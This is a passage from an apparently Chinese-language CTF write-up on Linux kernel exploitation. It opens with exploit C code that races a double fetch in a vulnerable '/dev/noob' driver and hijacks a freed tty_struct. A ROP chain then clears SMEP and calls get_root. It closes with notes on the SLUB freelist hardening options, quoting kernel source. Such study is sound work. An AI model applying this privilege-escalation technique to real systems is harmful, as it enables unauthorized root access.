class="pln"> </span><span class="pun">&amp;</span><span class="pln">arg</span><span class="pun">);</span></code></li><li class="L2"><code class="language-C"><span class="pun">}</span></code></li><li class="L3"><code class="language-C"></code></li><li class="L4"><code class="language-C"><span class="kwd">void</span><span class="pln"> edit</span><span class="pun">(</span><span class="kwd">int</span><span class="pln"> fd</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pln"> index</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">void</span><span class="pun">*</span><span class="pln"> point</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pln"> size</span><span class="pun">){</span></code></li><li class="L5"><code class="language-C"><span class="pln">    </span><span class="kwd">struct</span><span class="pln"> noob arg</span><span class="pun">;</span></code></li><li class="L6"><code class="language-C"><span class="pln">    arg</span><span class="pun">.</span><span class="pln">index </span><span class="pun">=</span><span class="pln"> index</span><span class="pun">;</span></code></li><li class="L7"><code class="language-C"><span class="pln">    arg</span><span class="pun">.</span><span class="pln">ptr </span><span class="pun">=</span><span class="pln"> point</span><span class="pun">;</span></code></li><li class="L8"><code class="language-C"><span class="pln">    arg</span><span class="pun">.</span><span class="pln">size </span><span class="pun">=</span><span class="pln"> size</span><span class="pun">;</span></code></li><li class="L9"><code class="language-C"><span class="pln">    ioctl</span><span class="pun">(</span><span class="pln">fd</span><span class="pun">,</span><span class="pln"> EDIT</span><span class="pun">,</span><span class="pln"> </span><span class="pun">&amp;</span><span class="pln">arg</span><span class="pun">);</span></code></li><li class="L0"><code class="language-C"><span class="pun">}</span></code></li><li class="L1"><code class="language-C"></code></li><li class="L2"><code class="language-C"><span class="kwd">void</span><span class="pln"> show</span><span class="pun">(</span><span class="kwd">int</span><span class="pln"> fd</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pln"> index</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">void</span><span class="pun">*</span><span class="pln"> point</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pln"> size</span><span class="pun">){</span></code></li><li class="L3"><code class="language-C"><span class="pln">    </span><span class="kwd">struct</span><span class="pln"> noob arg</span><span class="pun">;</span></code></li><li class="L4"><code class="language-C"><span class="pln">    arg</span><span class="pun">.</span><span class="pln">index </span><span class="pun">=</span><span class="pln"> index</span><span class="pun">;</span></code></li><li class="L5"><code class="language-C"><span class="pln">    arg</span><span class="pun">.</span><span class="pln">ptr </span><span class="pun">=</span><span class="pln"> point</span><span class="pun">;</span></code></li><li class="L6"><code class="language-C"><span class="pln">    arg</span><span class="pun">.</span><span class="pln">size </span><span class="pun">=</span><span class="pln"> size</span><span class="pun">;</span></code></li><li class="L7"><code class="language-C"><span class="pln">    ioctl</span><span class="pun">(</span><span class="pln">fd</span><span class="pun">,</span><span class="pln"> SHOW</span><span class="pun">,</span><span class="pln"> </span><span class="pun">&amp;</span><span class="pln">arg</span><span class="pun">);</span></code></li><li class="L8"><code class="language-C"><span class="pun">}</span></code></li><li class="L9"><code class="language-C"></code></li><li class="L0"><code class="language-C"><span class="kwd">int</span><span class="pln"> </span><span class="kwd">end</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span></code></li><li class="L1"><code class="language-C"><span class="kwd">void</span><span class="pun">*</span><span class="pln"> dou_fet</span><span class="pun">(</span><span class="kwd">void</span><span class="pln"> </span><span class="pun">*</span><span class="pln">args</span><span class="pun">){</span></code></li><li class="L2"><code class="language-C"><span class="pln">    </span><span class="kwd">struct</span><span class="pln"> noob </span><span class="pun">*</span><span class="pln">tmp </span><span class="pun">=</span><span class="pln"> </span><span class="pun">(</span><span class="kwd">struct</span><span class="pln"> noob </span><span class="pun">*)</span><span class="pln">args</span><span class="pun">;</span></code></li><li class="L3"><code class="language-C"><span class="pln">    </span><span class="kwd">while</span><span class="pun">(</span><span class="lit">1</span><span class="pun">){</span></code></li><li class="L4"><code class="language-C"><span class="pln">        </span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(</span><span class="kwd">end</span><span class="pln"> </span><span class="pun">==</span><span class="pln"> </span><span class="lit">1</span><span class="pun">)</span></code></li><li class="L5"><code class="language-C"><span class="pln">            </span><span class="kwd">break</span><span class="pun">;</span></code></li><li class="L6"><code class="language-C"><span class="pln">        tmp</span><span class="pun">-&gt;</span><span class="pln">size </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x2e0</span><span class="pun">;</span><span class="pln"> </span><span class="com">//size of tty_struct</span></code></li><li class="L7"><code class="language-C"><span class="pln">    </span><span class="pun">}</span></code></li><li class="L8"><code class="language-C"><span class="pun">}</span></code></li><li class="L9"><code class="language-C"></code></li><li class="L0"><code class="language-C"><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pln"> data</span><span class="pun">[</span><span class="lit">0x20</span><span class="pun">];</span></code></li><li class="L1"><code class="language-C"><span class="kwd">struct</span><span class="pln"> noob race </span><span class="pun">=</span><span class="pln"> </span><span class="pun">{</span><span class="lit">0</span><span class="pun">};</span></code></li><li class="L2"><code class="language-C"></code></li><li class="L3"><code class="language-C"><span class="kwd">int</span><span class="pln"> main</span><span class="pun">()</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L4"><code class="language-C"><span class="pln">    save_status</span><span class="pun">();</span></code></li><li class="L5"><code class="language-C"></code></li><li class="L6"><code class="language-C"><span class="pln">    </span><span class="kwd">int</span><span class="pln"> fd </span><span class="pun">=</span><span class="pln"> open</span><span class="pun">(</span><span class="str">"/dev/noob"</span><span class="pun">,</span><span class="pln"> </span><span class="lit">2</span><span class="pun">);</span></code></li><li class="L7"><code class="language-C"><span class="pln">    </span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(</span><span class="pln">fd </span><span class="pun">&lt;</span><span class="pln"> </span><span class="lit">0</span><span class="pun">){</span></code></li><li class="L8"><code class="language-C"><span class="pln">        perror</span><span class="pun">(</span><span class="str">"open"</span><span class="pun">);</span></code></li><li class="L9"><code class="language-C"><span class="pln">        </span><span class="kwd">exit</span><span class="pun">(</span><span class="lit">0</span><span class="pun">);</span></code></li><li class="L0"><code class="language-C"><span class="pln">    </span><span class="pun">}</span></code></li><li class="L1"><code class="language-C"></code></li><li class="L2"><code class="language-C"><span class="pln">    </span><span class="typ">pthread_t</span><span class="pln"> tid</span><span class="pun">;</span></code></li><li class="L3"><code class="language-C"><span class="pln">    printf</span><span class="pun">(</span><span class="str">"pthread create\n"</span><span class="pun">);</span></code></li><li class="L4"><code class="language-C"><span class="pln">    </span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(</span><span class="pln">pthread_create</span><span class="pun">(&amp;</span><span class="pln">tid</span><span class="pun">,</span><span class="pln"> NULL</span><span class="pun">,</span><span class="pln"> dou_fet</span><span class="pun">,</span><span class="pln"> </span><span class="pun">(</span><span class="kwd">void</span><span class="pln"> </span><span class="pun">*)&amp;</span><span class="pln">race</span><span class="pun">)</span><span class="pln"> </span><span class="pun">&lt;</span><span class="pln"> </span><span class="lit">0</span><span class="pun">){</span></code></li><li class="L5"><code class="language-C"><span class="pln">        perror</span><span class="pun">(</span><span class="str">"pthread"</span><span class="pun">);</span></code></li><li class="L6"><code class="language-C"><span class="pln">        </span><span class="kwd">exit</span><span class="pun">(</span><span class="lit">0</span><span class="pun">);</span></code></li><li class="L7"><code class="language-C"><span class="pln">    </span><span class="pun">}</span></code></li><li class="L8"><code class="language-C"></code></li><li class="L9"><code class="language-C"><span class="pln">    </span><span class="kwd">while</span><span class="pun">(</span><span class="lit">1</span><span class="pun">){</span></code></li><li class="L0"><code class="language-C"><span class="pln">        race</span><span class="pun">.</span><span class="pln">size </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span></code></li><li class="L1"><code class="language-C"><span class="pln">        </span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(</span><span class="pln">ioctl</span><span class="pun">(</span><span class="pln">fd</span><span class="pun">,</span><span class="pln"> ADD</span><span class="pun">,</span><span class="pln"> </span><span class="pun">&amp;</span><span class="pln">race</span><span class="pun">)</span><span class="pln"> </span><span class="pun">==</span><span class="pln"> </span><span class="lit">0</span><span class="pun">){</span></code></li><li class="L2"><code class="language-C"><span class="pln">            printf</span><span class="pun">(</span><span class="str">"double_fetch\n"</span><span class="pun">);</span></code></li><li class="L3"><code class="language-C"><span class="pln">            </span><span class="kwd">end</span><span class="pun">=</span><span class="lit">1</span><span class="pun">;</span></code></li><li class="L4"><code class="language-C"><span class="pln">            </span><span class="kwd">break</span><span class="pun">;</span></code></li><li class="L5"><code class="language-C"><span class="pln">        </span><span class="pun">}</span></code></li><li class="L6"><code class="language-C"></code></li><li class="L7"><code class="language-C"><span class="pln">    </span><span class="pun">}</span></code></li><li class="L8"><code class="language-C"></code></li><li class="L9"><code class="language-C"><span class="pln">    </span><span class="kwd">delete</span><span class="pun">(</span><span class="pln">fd</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0</span><span class="pun">);</span></code></li><li class="L0"><code class="language-C"></code></li><li class="L1"><code class="language-C"><span class="pln">    </span><span class="kwd">int</span><span class="pln"> tty_fd</span><span class="pun">[</span><span class="lit">0x20</span><span class="pun">],</span><span class="pln"> uaf_fd</span><span class="pun">;</span></code></li><li class="L2"><code class="language-C"><span class="pln">    </span><span class="kwd">for</span><span class="pun">(</span><span class="kwd">int</span><span class="pln"> i</span><span class="pun">=</span><span class="lit">0</span><span class="pun">;</span><span class="pln">i</span><span class="pun">&lt;</span><span class="lit">0x20</span><span class="pun">;</span><span class="pln">i</span><span class="pun">++){</span></code></li><li class="L3"><code class="language-C"><span class="pln">        tty_fd</span><span class="pun">[</span><span class="pln">i</span><span class="pun">]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> open</span><span class="pun">(</span><span class="str">"/dev/ptmx"</span><span class="pun">,</span><span class="pln"> O_RDWR</span><span class="pun">);</span></code></li><li class="L4"><code class="language-C"><span class="pln">    </span><span class="pun">}</span></code></li><li class="L5"><code class="language-C"><span class="pln">    printf</span><span class="pun">(</span><span class="str">"seeking uaf fd\n"</span><span class="pun">);</span></code></li><li class="L6"><code class="language-C"><span class="pln">    </span><span class="kwd">for</span><span class="pun">(</span><span class="kwd">int</span><span class="pln"> i</span><span class="pun">=</span><span class="lit">0</span><span class="pun">;</span><span class="pln">i</span><span class="pun">&lt;</span><span class="lit">0x20</span><span class="pun">;</span><span class="pln">i</span><span class="pun">++){</span></code></li><li class="L7"><code class="language-C"><span class="pln">        show</span><span class="pun">(</span><span class="pln">fd</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0</span><span class="pun">,</span><span class="pln"> </span><span class="pun">(</span><span class="kwd">void</span><span class="pun">*)</span><span class="pln">data</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0x20</span><span class="pun">);</span></code></li><li class="L8"><code class="language-C"><span class="pln">        </span><span class="kwd">if</span><span class="pun">(</span><span class="pln">data</span><span class="pun">[</span><span class="lit">0</span><span class="pun">]</span><span class="pln"> </span><span class="pun">==</span><span class="pln"> </span><span class="lit">0x100005401</span><span class="pun">){</span></code></li><li class="L9"><code class="language-C"><span class="pln">            uaf_fd </span><span class="pun">=</span><span class="pln"> i</span><span class="pun">;</span></code></li><li class="L0"><code class="language-C"><span class="pln">            printf</span><span class="pun">(</span><span class="str">"uaf_fd: %d\n"</span><span class="pun">,</span><span class="pln"> uaf_fd</span><span class="pun">);</span></code></li><li class="L1"><code class="language-C"><span class="pln">            </span><span class="kwd">break</span><span class="pun">;</span></code></li><li class="L2"><code class="language-C"><span class="pln">        </span><span class="pun">}</span></code></li><li class="L3"><code class="language-C"><span class="pln">    </span><span class="pun">}</span></code></li><li class="L4"><code class="language-C"></code></li><li class="L5"><code class="language-C"><span class="pln">    </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pln"> fake_tty</span><span class="pun">[</span><span class="lit">20</span><span class="pun">]={</span><span class="lit">0</span><span class="pun">};</span></code></li><li class="L6"><code class="language-C"><span class="pln">    fake_tty</span><span class="pun">[</span><span class="lit">7</span><span class="pun">]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> X_A_S</span><span class="pun">;</span><span class="pln">  </span><span class="com">//tty_write</span></code></li><li class="L7"><code class="language-C"></code></li><li class="L8"><code class="language-C"><span class="pln">    </span><span class="kwd">void</span><span class="pln"> </span><span class="pun">*</span><span class="pln">fake_addr </span><span class="pun">=</span><span class="pln"> mmap</span><span class="pun">((</span><span class="kwd">void</span><span class="pln"> </span><span class="pun">*)(</span><span class="pln">X_A_S </span><span class="pun">&amp;</span><span class="pln"> </span><span class="lit">0xfffff000</span><span class="pun">),</span><span class="pln"> </span><span class="lit">0x4000</span><span class="pun">,</span><span class="pln"> PROT_READ </span><span class="pun">|</span><span class="pln"> PROT_WRITE</span><span class="pun">,</span><span class="pln"> MAP_PRIVATE </span><span class="pun">|</span><span class="pln"> MAP_ANON </span><span class="pun">|</span><span class="pln"> MAP_FIXED</span><span class="pun">,</span><span class="pln"> </span><span class="pun">-</span><span class="lit">1</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0</span><span class="pun">);</span></code></li><li class="L9"><code class="language-C"></code></li><li class="L0"><code class="language-C"><span class="pln">    </span><span class="kwd">int</span><span class="pln"> i</span><span class="pun">=</span><span class="lit">0</span><span class="pun">;</span></code></li><li class="L1"><code class="language-C"><span class="pln">    </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pln"> rop</span><span class="pun">[</span><span class="lit">10</span><span class="pun">]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="pun">{</span><span class="lit">0</span><span class="pun">};</span></code></li><li class="L2"><code class="language-C"><span class="pln">    rop</span><span class="pun">[</span><span class="pln">i</span><span class="pun">++]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0xffffffff8107f460</span><span class="pun">;</span><span class="pln"> </span><span class="com">//pop_rdi_ret</span></code></li><li class="L3"><code class="language-C"><span class="pln">    rop</span><span class="pun">[</span><span class="pln">i</span><span class="pun">++]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x6e0</span><span class="pun">;</span></code></li><li class="L4"><code class="language-C"><span class="pln">    rop</span><span class="pun">[</span><span class="pln">i</span><span class="pun">++]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0xffffffff8101f2f0</span><span class="pun">;</span><span class="pln"> </span><span class="com">//mov_rc4_rdi_pop_rbp_ret</span></code></li><li class="L5"><code class="language-C"><span class="pln">    rop</span><span class="pun">[</span><span class="pln">i</span><span class="pun">++]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span></code></li><li class="L6"><code class="language-C"><span class="pln">    rop</span><span class="pun">[</span><span class="pln">i</span><span class="pun">++]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="pun">(</span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pun">)</span><span class="pln">get_root</span><span class="pun">;</span></code></li><li class="L7"><code class="language-C"></code></li><li class="L8"><code class="language-C"><span class="pln">    memcpy</span><span class="pun">((</span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pun">*)(</span><span class="pln">X_A_S </span><span class="pun">&amp;</span><span class="pln"> </span><span class="lit">0xffffffff</span><span class="pun">),</span><span class="pln"> rop</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">sizeof</span><span class="pun">(</span><span class="pln">rop</span><span class="pun">));</span></code></li><li class="L9"><code class="language-C"><span class="pln">    memcpy</span><span class="pun">((</span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pun">*)(</span><span class="pln">fake_addr</span><span class="pun">+</span><span class="lit">0x2000</span><span class="pun">),</span><span class="pln"> fake_tty</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">sizeof</span><span class="pun">(</span><span class="pln">fake_tty</span><span class="pun">));</span></code></li><li class="L0"><code class="language-C"><span class="pln">    data</span><span class="pun">[</span><span class="lit">3</span><span class="pun">]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="pun">(</span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pun">)(</span><span class="pln">fake_addr</span><span class="pun">+</span><span class="lit">0x2000</span><span class="pun">);</span><span class="pln"> </span><span class="com">//tty_operations</span></code></li><li class="L1"><code class="language-C"><span class="pln">    edit</span><span class="pun">(</span><span class="pln">fd</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0</span><span class="pun">,</span><span class="pln"> data</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0x20</span><span class="pun">);</span></code></li><li class="L2"><code class="language-C"></code></li><li class="L3"><code class="language-C"><span class="pln">    </span><span class="kwd">char</span><span class="pln"> buf</span><span class="pun">[</span><span class="lit">8</span><span class="pun">]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="pun">{</span><span class="lit">0</span><span class="pun">};</span></code></li><li class="L4"><code class="language-C"><span class="pln">    write</span><span class="pun">(</span><span class="pln">tty_fd</span><span class="pun">[</span><span class="pln">uaf_fd</span><span class="pun">],</span><span class="pln"> buf</span><span class="pun">,</span><span class="pln"> </span><span class="lit">8</span><span class="pun">);</span></code></li><li class="L5"><code class="language-C"></code></li><li class="L6"><code class="language-C"><span class="pln">    </span><span class="kwd">return</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span></code></li><li class="L7"><code class="language-C"><span class="pun">}</span></code></li></ol></pre><p data-anchor-id="p85i"><img src="http://static.zybuluo.com/leafish/vyz71tvzk27vi1xlkuhub29q/image_1e6arvrf11sodt53eamhob163vm.png" alt="image_1e6arvrf11sodt53eamhob163vm.png-117kB" title=""></p><div class="md-section-divider"></div><h3 data-anchor-id="3a48" id="附加知识">附加知识</h3><div class="md-section-divider"></div><h4 data-anchor-id="fza8" id="编译选项-configslabfreelisthardened">编译选项 CONFIG_SLAB_FREELIST_HARDENED</h4><p data-anchor-id="fk9o">在这个配置下,<code>include/linux/slub_def.h</code>文件里的 <code>kmem_cache</code> 增加了一个变量<code>random</code>。</p><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="ci0k"><ol class="linenums"><li class="L0"><code class="language-C"><span class="kwd">struct</span><span class="pln"> kmem_cache </span><span class="pun">{</span></code></li><li class="L1"><code class="language-C"><span class="pln">    </span><span class="kwd">struct</span><span class="pln"> kmem_cache_cpu __percpu </span><span class="pun">*</span><span class="pln">cpu_slab</span><span class="pun">;</span></code></li><li class="L2"><code class="language-C"><span class="pln">    </span><span class="pun">[...]</span></code></li><li class="L3"><code class="language-C"><span class="com">#ifdef</span><span class="pln"> CONFIG_SLAB_FREELIST_HARDENED</span></code></li><li class="L4"><code class="language-C"><span class="pln">    </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pln"> random</span><span class="pun">;</span></code></li><li class="L5"><code class="language-C"><span class="com">#endif</span></code></li><li class="L6"><code class="language-C"><span class="pun">}</span></code></li></ol></pre><p data-anchor-id="lsbm">在<code>mm/slub.c</code>文件, <code>kmem_cache_open()</code>函数给<code>random</code>字段一个随机数</p><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="d1sg"><ol class="linenums"><li class="L0"><code class="language-C"><span class="kwd">static</span><span class="pln"> </span><span class="kwd">int</span><span class="pln"> kmem_cache_open</span><span class="pun">(</span><span class="kwd">struct</span><span class="pln"> kmem_cache </span><span class="pun">*</span><span class="pln">s</span><span class="pun">,</span><span class="pln"> </span><span class="typ">slab_flags_t</span><span class="pln"> flags</span><span class="pun">)</span></code></li><li class="L1"><code class="language-C"><span class="pun">{</span></code></li><li class="L2"><code class="language-C"><span class="pln">    </span><span class="pun">[...]</span></code></li><li class="L3"><code class="language-C"><span class="pln">    s</span><span class="pun">-&gt;</span><span class="pln">flags </span><span class="pun">=</span><span class="pln"> kmem_cache_flags</span><span class="pun">(</span><span class="pln">s</span><span class="pun">-&gt;</span><span class="pln">size</span><span class="pun">,</span><span class="pln"> flags</span><span class="pun">,</span><span class="pln"> s</span><span class="pun">-&gt;</span><span class="pln">name</span><span class="pun">,</span><span class="pln"> s</span><span class="pun">-&gt;</span><span class="pln">ctor</span><span class="pun">);</span></code></li><li class="L4"><code class="language-C"><span class="com">#ifdef</span><span class="pln"> CONFIG_SLAB_FREELIST_HARDENED</span></code></li><li class="L5"><code class="language-C"><span class="pln">    s</span><span class="pun">-&gt;</span><span class="pln">random </span><span class="pun">=</span><span class="pln"> get_random_long</span><span class="pun">();</span></code></li><li class="L6"><code class="language-C"><span class="com">#endif</span></code></li><li class="L7"><code class="language-C"><span class="pun">}</span></code></li></ol></pre><p data-anchor-id="t8pw"><code>set_freepointer()</code>函数中加了一个检查，这里是检查<code>double free</code>的，即当前释放的<code>object</code>的内存地址和<code>freelist</code>指向的第一个<code>object</code>的地址不能一样。</p><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="gm1n"><ol class="linenums"><li class="L0"><code class="language-C"><span class="kwd">static</span><span class="pln"> </span><span class="kwd">inline</span><span class="pln"> </span><span class="kwd">void</span><span class="pln"> set_freepointer</span><span class="pun">(</span><span class="kwd">struct</span><span class="pln"> kmem_cache </span><span class="pun">*</span><span class="pln">s</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">void</span><span class="pln"> </span><span class="pun">*</span><span class="kwd">object</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">void</span><span class="pln"> </span><span class="pun">*</span><span class="pln">fp</span><span class="pun">)</span></code></li><li class="L1"><code class="language-C"><span class="pun">{</span></code></li><li class="L2"><code class="language-C"><span class="pln">    </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pln"> freeptr_addr </span><span class="pun">=</span><span class="pln"> </span><span class="pun">(</span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pun">)</span><span class="kwd">object</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> s</span><span class="pun">-&gt;</span><span class="pln">offset</span><span class="pun">;</span></code></li><li class="L3"><code class="language-C"></code></li><li class="L4"><code class="language-C"><span class="com">#ifdef</span><span class="pln"> CONFIG_SLAB_FREELIST_HARDENED</span></code></li><li class="L5"><code class="language-C"><span class="pln">    BUG_ON</span><span class="pun">(</span><span class="kwd">object</span><span class="pln"> </span><span class="pun">==</span><span class="pln"> fp</span><span class="pun">);</span><span class="pln"> </span><span class="com">/* naive detection of double free or corruption */</span></code></li><li class="L6"><code class="language-C"><span class="com">#endif</span></code></li><li class="L7"><code class="language-C"></code></li><li class="L8"><code class="language-C"><span class="pln">    </span><span class="pun">*(</span><span class="kwd">void</span><span class="pln"> </span><span class="pun">**)</span><span class="pln">freeptr_addr </span><span class="pun">=</span><span class="pln"> freelist_ptr</span><span class="pun">(</span><span class="pln">s</span><span class="pun">,</span><span class="pln"> fp</span><span class="pun">,</span><span class="pln"> freeptr_addr</span><span class="pun">);</span></code></li><li class="L9"><code class="language-C"><span class="pun">}</span></code></li></ol></pre><p data-anchor-id="o32n">接着是<code>freelist_ptr</code>, 它会返回当前<code>object</code>的下一个<code>free object</code>的地址，<code>hardened</code>情况下，<code>fd</code>处不会简单储存下一个<code>free object</code>的地址。 <br>
<strong>下一个free object的地址</strong> = <strong>random</strong> ^ <strong>当前free object的地址</strong> ^ <strong>当前free object 原本fd处的值</strong></p><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="dh50"><ol class="linenums"><li class="L0"><code class="language-C"><span class="kwd">static</span><span class="pln"> </span><span class="kwd">inline</span><span class="pln"> </span><span class="kwd">void</span><span class="pln"> </span><span class="pun">*</span><span class="pln">freelist_ptr</span><span class="pun">(</span><span class="kwd">const</span><span class="pln"> </span><span class="kwd">struct</span><span class="pln"> kmem_cache </span><span class="pun">*</span><span class="pln">s</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">void</span><span class="pln"> </span><span class="pun">*</span><span class="pln">ptr</span><span class="pun">,</span></code></li><li class="L1"><code class="language-C"><span class="pln">                 </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pln"> ptr_addr</span><span class="pun">)</span></code></li><li class="L2"><code class="language-C"><span class="pun">{</span></code></li><li class="L3"><code class="language-C"><span class="com">#ifdef</span><span class="pln"> CONFIG_SLAB_FREELIST_HARDENED</span></code></li><li class="L4"><code class="language-C"></code></li><li class="L5"><code class="language-C"><span class="pln">    </span><span class="kwd">return</span><span class="pln"> </span><span class="pun">(</span><span class="kwd">void</span><span class="pln"> </span><span class="pun">*)((</span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pun">)</span><span class="pln">ptr </span><span class="pun">^</span><span class="pln"> s</span><span class="pun">-&gt;</span><span class="pln">random </span><span class="pun">^</span></code></li><li class="L6"><code class="language-C"><span class="pln">            </span><span class="pun">(</span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pun">)</span><span class="pln">kasan_reset_tag</span><span class="pun">((</span><span class="kwd">void</span><span class="pln"> </span><span class="pun">*)</span><span class="pln">ptr_addr</span><span class="pun">));</span></code></li><li class="L7"><code class="language-C"><span class="com">#else</span></code></li><li class="L8"><code class="language-C"><span class="pln">    </span><span class="kwd">return</span><span class="pln"> ptr</span><span class="pun">;</span></code></li><li class="L9"><code class="language-C"><span class="com">#endif</span></code></li><li class="L0"><code class="language-C"><span class="pun">}</span></code></li></ol></pre><p data-anchor-id="hgw6">可以说，<code>CONFIG_SLAB_FREELIST_HARDENED</code>就是加了个给<code>fd</code>指针异或加密，这样如果有溢出就读不到内存地址，因为要溢出覆盖，不知道<code>random</code>的值也很难继续利用。</p><div class="md-section-divider"></div><h4 data-anchor-id="zt16" id="编译选项-configslabfreelistrandom">编译选项 CONFIG_SLAB_FREELIST_RANDOM</h4><p data-anchor-id="nsog">在这个配置下，<code>kmem_cache</code> 会添加一个 数组。</p><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="v1xk"><ol class="linenums"><li class="L0"><code class="language-C"><span class="com">#ifdef</span><span class="pln"> CONFIG_SLAB_FREELIST_RANDOM</span></code></li><li class="L1"><code class="language-C"><span class="pln">    </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">int</span><span class="pln"> </span><span class="pun">*</span><span class="pln">random_seq</span><span class="pun">;</span></code></li><li class="L2"><code class="language-C"><span class="com">#endif</span></code></li></ol></pre><p data-anchor-id="ngmb">具体代码实现在<code>mm/slab_common.c</code>以及<code>mm/slab.c</code>里，首先是初始化</p><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="alww"><ol class="linenums"><li class="L0"><code class="language-C"><span class="com">/* Initialize each random sequence freelist per cache */</span></code></li><li class="L1"><code class="language-C"><span class="kwd">static</span><span class="pln"> </span><span class="kwd">void</span><span class="pln"> __init init_freelist_randomization</span><span class="pun">(</span><span class="kwd">void</span><span class="pun">)</span></code></li><li class="L2"><code class="language-C"><span class="pun">{</span></code></li><li class="L3"><code class="language-C"><span class="pln">    </span><span class="kwd">struct</span><span class="pln"> kmem_cache </span><span class="pun">*</span><span class="pln">s</span><span class="pun">;</span></code></li><li class="L4"><code class="language-C"></code></li><li class="L5"><code class="language-C"><span class="pln">    mutex_lock</span><span class="pun">(&amp;</span><span class="pln">slab_mutex</span><span class="pun">);</span></code></li><li class="L6"><code class="language-C"></code></li><li class="L7"><code class="language-C"><span class="pln">    </span><span class="com">// 对每个kmem_cache</span></code></li><li class="L8"><code class="language-C"><span class="pln">    list_for_each_entry</span><span class="pun">(</span><span class="pln">s</span><span class="pun">,</span><span class="pln"> </span><span class="pun">&amp;</span><span class="pln">slab_caches</span><span class="pun">,</span><span class="pln"> list</span><span class="pun">)</span></code></li><li class="L9"><code class="language-C"><span class="pln">        init_cache_random_seq</span><span class="pun">(</span><span class="pln">s</span><span class="pun">);</span></code></li><li class="L0"><code class="language-C"></code></li><li class="L1"><code class="language-C"><span class="pln">    mutex_unlock</span><span class="pun">(&amp;</span><span class="pln">slab_mutex</span><span class="pun">);</span></code></li><li class="L2"><code class="language-C"><span class="pun">}</span></code></li><li class="L3"><code class="language-C"></code></li><li class="L4"><code class="language-C"></code></li><li class="L5"><code class="language-C"><span class="kwd">static</span><span class="pln"> </span><span class="kwd">int</span><span class="pln"> init_cache_random_seq</span><span class="pun">(</span><span class="kwd">struct</span><span class="pln"> kmem_cache </span><span class="pun">*</span><span class="pln">s</span><span class="pun">)</span></code></li><li class="L6"><code class="language-C"><span class="pun">{</span></code></li><li class="L7"><code class="language-C"><span class="pln">    </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">int</span><span class="pln"> count </span><span class="pun">=</span><span class="pln"> oo_objects</span><span class="pun">(</span><span class="pln">s</span><span class="pun">-&gt;</span><span class="pln">oo</span><span class="pun">);</span></code></li><li class="L8"><code class="language-C"><span class="pln">    </span><span class="kwd">int</span><span class="pln"> err</span><span class="pun">;</span></code></li><li class="L9"><code class="language-C"><span class="pln">    </span><span class="pun">[...]</span></code></li><li class="L0"><code class="language-C"></code></li><li class="L1"><code class="language-C"><span class="pln">    </span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(</span><span class="pln">s</span><span class="pun">-&gt;</span><span class="pln">random_seq</span><span class="pun">)</span></code></li><li class="L2"><code class="language-C"><span class="pln">        </span><span class="kwd">return</span><span 